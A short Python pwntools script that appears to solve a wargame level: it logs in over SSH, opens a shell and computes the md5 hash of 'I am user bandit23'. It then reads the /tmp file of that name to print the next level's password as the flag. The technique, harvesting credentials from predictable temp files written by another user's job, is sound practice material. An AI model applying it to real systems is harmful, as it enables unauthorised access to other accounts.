from pwn import *
import os
import config

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

conn = ssh(host=config.url, user=user, password=password, port=config.port)

shell = conn.process("/bin/sh", stderr="/dev/null")
shell.sendline("echo I am user bandit23 | md5sum | cut -d ' ' -f 1")

md5hash = shell.recv()
file = os.path.join("/tmp", md5hash.strip())

flag = conn.cat(file)

print("Flag : " + flag)
